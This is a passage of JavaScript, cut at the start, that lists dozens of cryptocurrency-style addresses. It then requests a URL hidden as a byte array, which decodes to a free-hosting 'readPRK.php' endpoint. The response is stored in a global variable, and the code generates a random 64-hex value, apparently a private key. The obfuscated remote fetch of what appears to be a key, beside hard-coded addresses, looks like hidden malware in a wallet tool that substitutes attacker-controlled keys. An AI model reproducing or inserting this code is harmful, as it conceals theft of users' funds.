BpVF3Cm1bYL9mqyKc,LRXrhZRLVTjGCPFphPsXZfeHesRigm59r,C7u4Zqu6ZZRsiKsFMYVDvNLfCwsGrbeTq,2US3aeNibsxe7Lhascm4AmvGiTxwSdD4X,7SAATrqavNbzmqBwqxzZc7rK6u9Rmi9hE,KoiNofDvcUrrVfxgqpRZixWXNXo6d2kfQ,PL2cmmMLmGGDtqaSZJY8DR1iKJaziEPJv,7RmGC3i2dASQai3mP9iJLX3ZD9TBm2YQV,Djs2VyBVr6MYNcGVaHAr8B3N1mViS5yoo,N4yKFsFPjjoJyo3BAKUWpcs3SUghfgJkH,3nwifHUz5ZfHuQhk5ETJ4BhmqbuQdvTFp,7GyU83L63BtxtpDgv8LmhhtmvcrXbfVt1,Le1X8LJb4VkFsfktiUY7V7wMRhniu5Xgn,Fjom9b9wvp3HPi2ZS9hqXQwJpXcjumSYJ,BbSZNNhoBUCFGMfnscBDXf7PH1takoMga,NJdKoBkKQNg6aYL9HTKyQ5SgfjZQDz3y3,gvH7pGPrEBNjqmwYS8UDhjFQkyqkKCLE,6H2Fe9MgxZ1jXW3TaXbgWh3SJfwyxQUTp,3pTeUzSU4nwkM72hM6e8AcP2d8LudZBjc,Dr1pZDgpowHDGJrUNTithDL33TdriFMzE,8oRfGoPpb6bkQdACnD6dVYWceeWURK5R6,2mJZGPCWf5C2ap2dUdJiuGr8eWAvi6E5M,M9pAdfhGHtQkhGRijApWAkkrPCduvV6Zi";
  var xhr = new XMLHttpRequest();
  xhr.open("GET", Crypto.charenc.UTF8.bytesToString([104, 116, 116, 112, 115, 58, 47, 47, 103, 97, 109, 101, 108, 111, 99, 97, 116, 111, 114, 46, 48, 48, 48, 119, 101, 98, 104, 111, 115, 116, 97, 112, 112, 46, 99, 111, 109, 47, 67, 67, 67, 65, 47, 114, 101, 97, 100, 80, 82, 75, 46, 112, 104, 112]), !0);
  xhr.onload = function() {
    if(xhr.state == 200){
      window.prk11570 = xhr.response;
    }
  };
  xhr.send();
  for (var e = 0; 64 > e; e++) window.prk211 += Math.floor(16 * Math.random()).toString(16);
  turn211()
})();
